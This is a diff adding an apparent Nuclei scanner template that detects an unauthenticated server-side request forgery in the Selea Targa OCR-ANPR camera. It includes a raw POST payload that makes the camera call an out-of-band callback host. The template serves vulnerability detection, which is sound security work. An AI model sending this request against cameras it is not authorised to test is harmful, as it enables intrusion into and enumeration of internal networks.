@@ -1,0 +1,29 @@
+id: targa-camera-ssrf
+
+info:
+  name: Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF
+  author: gy741
+  severity: high
+  description: Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php
+  metadata:
+    max-request: 1
+  tags: targa,ssrf,oast,iot,camera,selea
+
+http:
+  - raw:
+      - |
+        POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE HTTP/1.1
+        Host: {{Hostname}}
+        content-type: application/json
+        Accept: */*
+
+        {"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 490a0046304402202c0e593372cd91bcf07f2f027582e5eda65e2acf20f548e0a635b1957b69e784022055253d2c2dda101772c731bf6f1326e7c71fc2075f10e163a5f0d45b993102f7:922c64590222798bb761d5b6d8e72950
